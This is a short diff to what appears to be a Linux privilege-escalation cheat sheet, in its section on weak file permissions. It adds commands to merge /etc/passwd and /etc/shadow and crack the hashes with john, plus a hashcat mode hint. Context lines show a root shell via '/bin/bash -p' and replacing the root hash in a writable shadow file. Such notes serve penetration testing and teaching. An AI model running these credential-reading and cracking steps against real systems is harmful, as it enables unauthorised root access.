@@ -184,9 +184,13 @@ Execute `/bin/bash -p` to gain a root shell.
 
 ## Weak file permissions
 
+!!! info
+    🐈‍⬛ Hashcat mode -> 1800
+
 ```shell
-# check if /etc/shadow can be readed and get the root hash or the file
+# check if /etc/shadow can be readed and combine it with /etc/passwd to crack it
 unshadow passwd shadow > passwords.txt
+john --wordlist=<wordlist> passwords.txt
 
 # check if /etc/shadow can be writable and put a new root hash
 mkpasswd -m sha-512 newpassword
